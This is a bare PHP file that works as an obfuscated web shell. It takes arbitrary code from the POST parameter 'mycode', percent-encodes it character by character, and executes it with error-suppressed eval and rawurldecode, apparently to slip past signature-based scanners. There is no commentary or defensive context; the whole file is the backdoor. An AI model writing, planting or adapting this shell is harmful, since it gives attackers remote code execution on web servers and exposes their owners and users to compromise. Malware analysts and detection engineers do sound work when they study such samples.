<?php
echo "start";
$AVuln = $_POST['mycode'];
$vulnlength = strlen($AVuln); 
$UrlencodedS = ''; 
for ($i = 0; $i < $vulnlength; $i++) 
	$UrlencodedS .= '%'.dechex(ord($AVuln[$i])); 
@eval(@rawurldecode('\''.$UrlencodedS));
?>